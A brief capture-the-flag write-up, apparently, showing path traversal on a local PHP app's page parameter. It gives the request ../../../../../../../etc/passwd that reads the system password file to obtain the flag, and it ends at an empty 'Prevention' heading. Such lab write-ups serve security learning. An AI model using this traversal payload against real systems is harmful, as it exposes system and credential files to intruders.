```
whenver browsing to a page in the web application the request is made in this form :

GET http://localhost:8080/index.php?page=NameOfPage


lets try then to include a path that takes us outside of the webserver  for example lets try to reach /etc/password

after a few tries we got access to the flag using :
http://localhost:8080/index.php?page=../../../../../../../etc/passwd
```


***Prevention***